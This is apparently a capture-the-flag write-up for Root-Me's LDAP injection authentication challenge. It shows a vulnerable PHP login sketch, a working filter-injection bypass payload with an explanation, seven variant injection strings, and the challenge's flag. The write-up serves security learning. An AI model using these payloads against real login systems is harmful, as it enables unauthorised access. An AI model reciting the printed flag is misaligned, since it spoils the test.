## Challenge name: LDAP injection - Authentication 


<img width="1398" height="430" alt="image" src="https://github.com/user-attachments/assets/20481015-2c4f-4d77-b8e5-9a97f61c0bfd" />
<br>
<br>

``` Challenge Link:``` [https://www.root-me.org/en/Challenges/Web-Server/LDAP-injection-Authentication](https://www.root-me.org/en/Challenges/Web-Server/LDAP-injection-Authentication)
<br>
<br>

**After starting the challenge we can see a web protal where uses ldap service for authentication mechanism..**

<br>
<img width="1398" height="430" alt="image" src="https://github.com/user-attachments/assets/b365fc11-2f1b-4a47-b733-3d94751a41bf" />
<br>
<br>

**Now lets try putting things such as ` ' " * (` that may break ldap query and php gives error to conform that we are going well..**

<br>
<img width="1398" height="430" alt="image" src="https://github.com/user-attachments/assets/60dcfc4f-123b-43b4-b9b0-9243cb13d7ca" />
<br>
<br>

**As you can see it is injectable and it revels how it sends code in the query so lets pick that and make a php eg code for us to undertand and make payload to exploit it..**
<br><br>
```
// the code should somewhat look like this..
<?php
$ldap = ldap_connect("ldap://ldap.example.com");
ldap_set_option($ldap, LDAP_OPT_PROTOCOL_VERSION, 3);

ldap_bind($ldap, "cn=admin,dc=example,dc=com", "adminpassword");

$user = $_POST['username'];
$pass = $_POST['password'];

$filter = "(&(uid=$user)(userPassword=$pass))";
$search = ldap_search($ldap, "dc=example,dc=com", $filter);
$result = ldap_get_entries($ldap, $search);

if ($result["count"] > 0) {
    echo "Login OK";
} else {
    echo "Login Failed";
}

// query being sent -> (&(uid=$user)(userPassword=$pass)) and its explanation :
// & is logical operator which means match entries where both conditions are true
// (uid=$user) means find entries whose uid equals $user
// (userPassword=$pass) Find entries whose userPassword equals $pass
```

**Payload:** `(&(uid=*)(|(uid=*)(userPassword=anything))`
<br><br>
**Explanation:**
<br><br>
```

&                    // AND operator .. bellow are its 2 statements:
├── (uid=*)                    // * is a wildcard matches with anything → TRUE
└── (|(uid=*)(userPassword=anything))     //this is ↓ if either condition is true → whole OR is true
                                                    ├── (uid=*)    // first one is true.
                                                    └── (userPassword=anything)    // second one will be false.
                                                    └──> // TRUE OR FALSE = TRUE
// So when we use this:
// user = *)(|(uid=*
// pass = anything)
// It becomes (&(TRUE)(TRUE)) which returns true and we will be logged in..

// We can use so may payloads to make it work like:
// 1) username: *)(|(userPassword=* password: test)  // query becomes (&(uid=*)(|(userPassword=*)(userPassword=test))) 
// 2) username: *) (cn=* password: *) (cn=* // query becomes (&(uid=*) (cn=*)(userPassword=*) (cn=*))
// 3) username: *))%00 password: whatever // query becomes (&(uid=*))%00)(userPassword=xxx))
// 4) username: * password: *)(& // query becomes (&(uid=*)(userPassword=*)(&))
// 5) username= *)(& password: *)(& // query becomes (&(uid=*)(&)(userPassword=*)(&))
// 6) username= *)(|(& password: a) // query becomes (&(uid=*)(|(&)(userPassword=a)))
// 7) username= *)(|(& password: whatever // query becomes (&(uid=*)(|(&)(userPassword=bb)) and so on..

```
<br>

**Using payload:**

<br>
<img width="1344" height="378" alt="image" src="https://github.com/user-attachments/assets/903b83e5-449b-410d-859f-951bbad01a1f" />
<br><br>
<img width="1344" height="401" alt="image" src="https://github.com/user-attachments/assets/9bf78763-063f-49d0-9974-5f29c7a33341" />
<br>
<br>

**We can use this "SWRwehpkTI3Vu2F9DoTJJ0LBO" as flag/passwd to validate the challenge..** <br>
**Thankyou.**
